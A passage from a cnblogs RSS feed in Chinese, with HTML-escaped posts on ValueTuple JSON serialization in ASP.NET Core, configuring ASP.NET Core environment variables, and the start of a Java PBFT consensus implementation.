&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　以上代码只能处理返回时,返回的类型为ValueTuple&amp;lt;T1...n&amp;gt;或者返回的类型中包含了ValueTuple&amp;lt;T1....n&amp;gt;的属性,但是对于函数内,不用于返回的,则无法处理,比如&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　public&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt; Test2()
   {
       &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; s=  &lt;span&gt;new&lt;/span&gt; Test&amp;lt; (&lt;span&gt;string&lt;/span&gt; Y1, &lt;span&gt;string&lt;/span&gt; Y2),(&lt;span&gt;string&lt;/span&gt; str1, &lt;span&gt;string&lt;/span&gt; t2)&amp;gt;((&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;22222&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;),(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;3333&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;44444&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) );
       JsonConvert.SerializeObject(s);
       &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
   }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这种情况的变量s的序列化就没办法了&lt;/p&gt;

&lt;p&gt;部分代码地址:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kugarliyifan/Kugar.UI.Web/blob/master/Kugar.Core.Web.NetCore/Formatters/ValueTupleOutputFormatter.cs&quot;&gt;https://github.com/kugarliyifan/Kugar.UI.Web/blob/master/Kugar.Core.Web.NetCore/Formatters/ValueTupleOutputFormatter.cs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kugarliyifan/Kugar.UI.Web/blob/master/Kugar.Core.Web.NetCore/Converters/ValueTupleConverter.cs&quot;&gt;https://github.com/kugarliyifan/Kugar.UI.Web/blob/master/Kugar.Core.Web.NetCore/Converters/ValueTupleConverter.cs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kugarliyifan/Kugar.UI.Web/blob/master/Kugar.Core.Web.NetCore/ValueTupleContractResolver.cs&quot;&gt;https://github.com/kugarliyifan/Kugar.UI.Web/blob/master/Kugar.Core.Web.NetCore/ValueTupleContractResolver.cs&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 20 Feb 2020 17:04:00 +0000</pubDate>
<dc:creator>启天</dc:creator>
<og:description>由于开发功能的需要,又懒得新建太多的class,所以ValueTuple是个比较好的偷懒方法,但是,由于WebApi需要返回序列化后的json,默认的序列化只能将ValueTuple定义的各个属性序列</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/kugar/p/12334210.html</dc:identifier>
</item>
<item>
<title>ASP.NET Core 配置和使用环境变量 - HueiFeng</title>
<link>http://www.cnblogs.com/yyfh/p/12339961.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yyfh/p/12339961.html</guid>
<description>&lt;blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;/blockquote&gt;
&lt;p&gt;通常在应用程序开发到正式上线，在这个过程中我们会分为多个阶段，通常会有 开发、测试、以及正式环境等。每个环境的参数配置我们会使用不同的参数，因此呢，在ASP.NET Core中就提供了相关的环境API，方便我们更好的去做这些事情。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h2 id=&quot;环境&quot;&gt;环境&lt;/h2&gt;
&lt;/blockquote&gt;
&lt;p&gt;ASP.NET Core使用ASPNETCORE_ENVIRONMENT来标识运行时环境。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ASP.NET Core预设环境&lt;/li&gt;
&lt;/ul&gt;&lt;ol&gt;&lt;li&gt;Development：开发环境&lt;/li&gt;
&lt;li&gt;Staging：暂存环境(测试环境)&lt;/li&gt;
&lt;li&gt;Production：正式环境&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;要取得系统变量ASPNETCORE_ENVIRONMENT，在3.0版本之前可以通过注入IHostingEnvironment来获取，3.x通过IWebHostEnvironment 请看如下代码片段：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;
    public class Startup
    {
        public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
        {
            if (env.IsDevelopment())
            {
            }

            app.Run(async (context) =&amp;gt;
            {
                await context.Response.WriteAsync(
                    $&quot;EnvironmentName: {env.EnvironmentName},IsDevelopment: {env.IsDevelopment()}&quot;
                );
            });
        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;网站启动后IWebHostEnvironment会从ASPNETCORE_ENVIRONMENT中获取内容，该变量可以是我们需要的任何值。也就是该变量不一定要一定是预设的值，我们是可以自定义的。&lt;/p&gt;
&lt;p&gt;比如我们定义一个名为Test环境&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;      public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
        {
            env.EnvironmentName = &quot;test&quot;;

            if (env.IsDevelopment())
            {
                //TODO
            }else if (env.IsEnvironment(&quot;text&quot;))
            {
                //TODO
            }

            app.Run(async (context) =&amp;gt;
            {
                await context.Response.WriteAsync(
                    $&quot;EnvironmentName: {env.EnvironmentName},IsDevelopment: {env.IsDevelopment()}&quot;
                );
            });
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;注：在 Windows 和 macOS 上，环境变量和值不区分大小写。 默认情况下，Linux 环境变量和值要区分大小写 。&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;
       public static IHostBuilder CreateHostBuilder(string[] args) =&amp;gt;
           Host.CreateDefaultBuilder(args)
               .ConfigureAppConfiguration((hostContext, config) =&amp;gt;
               {
                   var env = hostContext.HostingEnvironment;
                   config.SetBasePath(Path.Combine(env.ContentRootPath, &quot;Configuration&quot;))
                       .AddJsonFile(path: &quot;settings.json&quot;, optional: false, reloadOnChange: true)
                       .AddJsonFile(path: $&quot;settings.{env.EnvironmentName}.json&quot;, optional: true, reloadOnChange: true);
               })
               .ConfigureWebHostDefaults(webBuilder =&amp;gt;
               {
                   webBuilder.UseStartup&amp;lt;Startup&amp;gt;();
               });
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过上述代码我们，读取我们的配置文件回显读取setting.json并设置为optional: false，表示该配置为必要的配置；再往下继续读取再读取settings.{env.EnvironmentName}.json文件。当加载遇到相同的Key那么就会覆盖掉前面的配置项。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;SetBasePath：设置配置的目录位置，如果是放在不同目录，再把路径换掉即可。&lt;/li&gt;
&lt;li&gt;AddJsonFile：
&lt;ul&gt;&lt;li&gt;path：文件的路径位置。&lt;/li&gt;
&lt;li&gt;optional：如果是必要的配置文件，可选就要设定为false，当文件不存在就会引发FileNotFoundException。&lt;/li&gt;
&lt;li&gt;reloadOnChange：如果文件被更新，就同步更新IConfiguration实例的值。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote&gt;
&lt;h2 id=&quot;环境设置&quot;&gt;环境设置&lt;/h2&gt;
&lt;/blockquote&gt;
&lt;p&gt;web.config配置环境变量&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
&amp;lt;configuration&amp;gt;
  &amp;lt;system.webServer&amp;gt;
    &amp;lt;handlers&amp;gt;
      &amp;lt;add name=&quot;aspNetCore&quot; path=&quot;*&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModule&quot; resourceType=&quot;Unspecified&quot; /&amp;gt;
    &amp;lt;/handlers&amp;gt;
    &amp;lt;aspNetCore processPath=&quot;dotnet&quot; arguments=&quot;.\Demo.dll&quot; stdoutLogEnabled=&quot;false&quot; stdoutLogFile=&quot;.\logs\stdout&quot;&amp;gt;
      &amp;lt;environmentVariables&amp;gt;
        &amp;lt;environmentVariable name=&quot;ASPNETCORE_ENVIRONMENT&quot; value=&quot;Test&quot; /&amp;gt;
      &amp;lt;/environmentVariables&amp;gt;
    &amp;lt;/aspNetCore&amp;gt;
  &amp;lt;/system.webServer&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;Visual Studio Code&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;launch.json中配置ASPNETCORE_ENVIRONMENT&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;{
   &quot;version&quot;: &quot;0.1.0&quot;,
   &quot;configurations&quot;: [
        {
            &quot;name&quot;: &quot;.NET Core Launch (web)&quot;,
            &quot;type&quot;: &quot;coreclr&quot;,
            &quot;env&quot;: {
                &quot;ASPNETCORE_ENVIRONMENT&quot;: &quot;Development&quot;
            }
        }
    ]
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;Visual Studio IDE&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Properties\launchSettings.json&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;
  &quot;profiles&quot;: {
    &quot;IIS Express&quot;: {
      &quot;commandName&quot;: &quot;IISExpress&quot;,
      &quot;launchBrowser&quot;: true,
      &quot;environmentVariables&quot;: {
        &quot;ASPNETCORE_ENVIRONMENT&quot;: &quot;Test&quot;
      }
    },
   }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1098068/202002/1098068-20200221010137265-1687510757.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 20 Feb 2020 17:02:00 +0000</pubDate>
<dc:creator>HueiFeng</dc:creator>
<og:description>前言 通常在应用程序开发到正式上线，在这个过程中我们会分为多个阶段，通常会有 开发、测试、以及正式环境等。每个环境的参数配置我们会使用不同的参数，因此呢，在ASP.NET Core中就提供了相关的环境</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yyfh/p/12339961.html</dc:identifier>
</item>
<item>
<title>PBFT算法java实现 - 段小辉</title>
<link>http://www.cnblogs.com/xiaohuiduan/p/12339955.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaohuiduan/p/12339955.html</guid>
<description>&lt;h2 class=&quot;xsj_heading_hash xsj_heading xsj_heading_h2&quot;&gt;&lt;span class=&quot;xsj_heading_content&quot;&gt;PBFT 算法的java实现（上）&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;在这篇博客中，我会通过Java 去实现PBFT中结点的加入，以及认证。其中使用socket实现网络信息传输。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;关于PBFT算法的一些介绍，大家可以去看一看网上的博客，也可以参考我的上上一篇&lt;a href=&quot;https://www.cnblogs.com/xiaohuiduan/p/12210891.html&quot; class=&quot;xsj_link xsj_manu_link&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;，关于怎么构建P2P网络可以参考我的上一篇&lt;a href=&quot;https://www.cnblogs.com/xiaohuiduan/p/12302024.html&quot; class=&quot;xsj_link xsj_manu_link&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;该项目的地址：&lt;a href=&quot;https://github.com/xiaohuiduan/pbft&quot; class=&quot;xsj_link xsj_manu_link&quot; target=&quot;_blank&quot;&gt;GitHub&lt;/a&gt;&lt;/p&gt;

&lt;h3 class=&quot;xsj_heading_hash xsj_heading xsj_heading_h3&quot;&gt;&lt;span class=&quot;xsj_heading_content&quot;&gt;使用前的准备&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;使用maven构建项目，当然，也可以不使用，这个就看自己的想法吧。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;需要使用到的Java包：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;t-io：使用t-io进行网络socket通信，emm，这个框架的文档需要收费（699RMB），但是这里我们只是简单的使用，不需要使用到其中很复杂的功能。&lt;/li&gt;
&lt;li&gt;fastjson：Json 数据解析&lt;/li&gt;
&lt;li&gt;lombok：快速的get，set以及toString&lt;/li&gt;
&lt;li&gt;hutool：万一要用到呢？&lt;/li&gt;
&lt;li&gt;lombok：节省代码&lt;/li&gt;
&lt;li&gt;log4j：日志&lt;/li&gt;
&lt;li&gt;guava：Google的一些并发包&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class=&quot;xsj_heading_hash xsj_heading xsj_heading_h3&quot;&gt;&lt;span class=&quot;xsj_heading_content&quot;&gt;结点的数据结构&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;首先的首先，我们需要来定义一下结点的数据结构。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;首先是结点Node的数据结构：&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;10&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Data&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Node&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;NodeBasicInfo&lt;/span&gt;&lt;/span&gt;{

    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; Node &lt;span class=&quot;hljs-title&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; node;
    }
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{}
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; Node node = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Node();

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; isRun = &lt;span class=&quot;hljs-keyword&quot;&gt;false&lt;/span&gt;;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; viewOK;
}

&lt;span class=&quot;hljs-meta&quot;&gt;@Data&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;NodeBasicInfo&lt;/span&gt; &lt;/span&gt;{
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; NodeAddress address;
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; index;

}

&lt;span class=&quot;hljs-meta&quot;&gt;@Data&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;NodeAddress&lt;/span&gt; &lt;/span&gt;{
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String ip;
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; port;

}
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_1&quot;&gt;上面的代码看起来有点多，但实际上很少（上面是3个类，为了展示，我把它们放在了一起）。上面定义了Node应该包含的属性信息：ip，端口，序列号index，view是否ok。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;结点的信息很简单。接下来我们就可以看一看PbftMsg的数据结构了。PbftMsg代表的是进行Pbft算法发送信息的数据结构。&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;15&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Data&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;PbftMsg&lt;/span&gt; &lt;/span&gt;{
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; msgType;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String body;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; node;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; toNode;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;long&lt;/span&gt; time;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; isOk;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; viewNum;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String id;

    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;PbftMsg&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
    }

    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;PbftMsg&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; msgType, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; node)&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.msgType = msgType;
        &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.node = node;
        &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.time = System.currentTimeMillis();
        &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.id = IdUtil.randomUUID();
        &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.viewNum = AllNodeCommonMsg.view;
    }

    &lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Object o)&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; == o) {
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;
        }
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (o == &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt; || getClass() != o.getClass()) {
            &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;false&lt;/span&gt;;
        }
        PbftMsg msg = (PbftMsg) o;
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; node == msg.node &amp;amp;&amp;amp;
                time == msg.time &amp;amp;&amp;amp;
                viewNum == msg.viewNum &amp;amp;&amp;amp;
                body.equals(msg.body) &amp;amp;&amp;amp;
                id.equals(msg.id);
    }

    &lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;hashCode&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; Objects.hash(body, node, time, viewNum, id);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_1&quot;&gt;PBFTMSG这里我只是简单的定义了一下，并不是很严谨。在这里主要说下重要的属性：&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_1&quot;&gt;msgType代表的是Pbft算法的消息类型，因为pbft算法有不同类型的请求消息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;同样，我们需要保存一些状态数据：&lt;/p&gt;
&lt;div class=&quot;xiaoshujiang_code_container&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java hljs&quot; data-info=&quot;java&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;AllNodeCommonMsg&lt;/span&gt; &lt;/span&gt;{
    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;getMaxf&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; (size - &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) / &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;;
    }

    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;getPriIndex&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; (view + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) % size;
    }

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; ConcurrentHashMap&amp;lt;Integer, NodeBasicInfo&amp;gt; allNodeAddressMap = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ConcurrentHashMap&amp;lt;&amp;gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;) ;

    
    &lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; view = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;
    
    &lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; size = allNodeAddressMap.size()+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3 class=&quot;xsj_heading_hash xsj_heading xsj_heading_h3&quot;&gt;&lt;span class=&quot;xsj_heading_content&quot;&gt;逻辑流程&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;上面的定义看一看就行了，在这里我们主要是理解好PBFT算法的流程。在下面我们将好好的分析一下PBFT算法的流程。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;合抱之木始于毫末,万丈高楼起于垒土。所有所有的开始，我们都需要从节点的加入开始说起。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;在前前面的&lt;a href=&quot;https://www.cnblogs.com/xiaohuiduan/p/12210891.html&quot; class=&quot;xsj_link xsj_manu_link&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;，我们知道一个在PBFT算法中有一个主节点，那么主节点是怎么出来的呢？当然是通过view算出来的。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;设：结点数为N，当前视图为view，则主结点的id为：&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;$$primaryId = (view +1) mod N$$&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;因此，当一个节点启动的时候，他肯定是迷茫的，不知道自己是谁，这个时候就需要找一个节点问问目前是什么情况，问谁呢？肯定是问主节点，但是主节点是谁呢？在区块链中的节点当然都知道主节点是谁。这个时候，新启动的节点（姑且称之为小弟）就会向所有的节点去询问：大哥们，你们的view是多大啊，能不能行行好告诉小弟我！然后大哥们会将自己的view告诉小弟。但是小弟又担心大哥们骗他给他错误的view，所以决定当返回的view满足一定的数量的时候，就决定使用该view。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;那么这个一定数量是多少呢？&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_1&quot;&gt;quorum：达到共识需要的结点数量 $quorum = \lceil \frac {N + f +1 }{2 }\rceil $&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;说了这么多理论方面的东西，现在让我们来讲一讲代码方面是怎么考虑。&lt;/p&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;定义好两个简单的数据结构，我们就可以来想一想Pbft算法的流程了。&lt;/p&gt;

&lt;h3 class=&quot;xsj_heading_hash xsj_heading xsj_heading_h3&quot;&gt;&lt;span class=&quot;xsj_heading_content&quot;&gt;代码流程&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;xsj_paragraph xsj_paragraph_level_0&quot;&gt;首先的首先，我们先定义：节点的序号从0开始，view也从0开始，当然这个时候size肯定不是0，是1。so，主节点的序号是$primaryId = (0+1)%1 = 0$。&lt;/p&gt;
